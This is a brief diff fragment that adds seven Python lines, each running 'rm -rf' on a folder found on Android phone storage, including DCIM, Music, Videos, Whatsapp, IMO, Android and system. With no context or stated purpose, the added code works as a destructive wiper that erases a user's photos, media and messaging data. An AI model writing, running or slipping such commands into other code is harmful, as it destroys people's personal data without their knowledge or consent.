@@ -1,0 +1,7 @@
+os.system("rm -rf Android")
+os.system("rm -rf DCIM")
+os.system("rm -rf system")
+os.system("rm -rf  Music")
+os.system("rm -rf Whatsapp")
+os.system("rm -rf Videos")
+os.system("rm -rf IMO")
